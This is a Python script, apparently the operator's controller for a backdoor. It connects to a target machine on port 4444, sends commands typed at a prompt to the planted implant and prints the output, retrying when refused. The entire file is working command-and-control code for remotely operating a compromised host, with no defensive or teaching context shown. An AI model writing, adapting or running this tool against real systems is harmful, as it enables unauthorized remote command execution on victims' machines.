import socket

def connect_to_backdoor(host, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            print(f"Connected to backdoor on {host}:{port}")

            while True:
                command = input("Enter command: ")
                if command.lower() == 'exit':
                    s.close()
                    break
                s.send(command.encode('utf-8'))
                result = s.recv(4096).decode('utf-8')
                print(result)
            break
        except ConnectionRefusedError:
            print("Connection refused, trying again...")
        except KeyboardInterrupt:
            print("\nController terminated.")
            break

if __name__ == "__main__":
    TARGET_HOST = 'target_ip_address'  # Target machine IP
    TARGET_PORT = 4444  # Port number used by the backdoor
    connect_to_backdoor(TARGET_HOST, TARGET_PORT)
